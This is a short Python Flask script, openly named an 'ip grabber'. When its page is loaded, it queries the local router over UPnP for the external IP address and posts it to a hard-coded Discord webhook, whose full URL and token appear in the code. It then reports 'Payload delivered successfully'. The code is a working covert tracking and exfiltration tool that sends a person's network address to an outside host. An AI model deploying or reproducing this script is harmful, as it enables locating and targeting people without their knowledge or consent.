from flask import Flask
import upnpclient
import requests

app = Flask(__name__)


@app.route('/')
def index():
    devices = upnpclient.discover()
    if(len(devices) > 0):
        externalIP = devices[0].WANIPConn1.GetExternalIPAddress()
        url = "https://discord.com/api/webhooks/953698784343388201/VYWzQlkBrsQ_0I89npV5Rl_0S5iH97dhT-NPSpq98Ne11rDCIzFdHsAOut1jtv1eaksA"
        data = {
            "content" : ".",
            "username" : "ip grabber"
        }
        data["embeds"] = [
            {
                "description" : f"{externalIP}",
                "title" : "new ip"
            }
        ]

        result = requests.post(url, json = data)

        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            return(err)
        else:
                
                return("Payload delivered successfully")
    else:
        return('No Connected network interface detected')


if __name__ == "__main__":
    app.run()
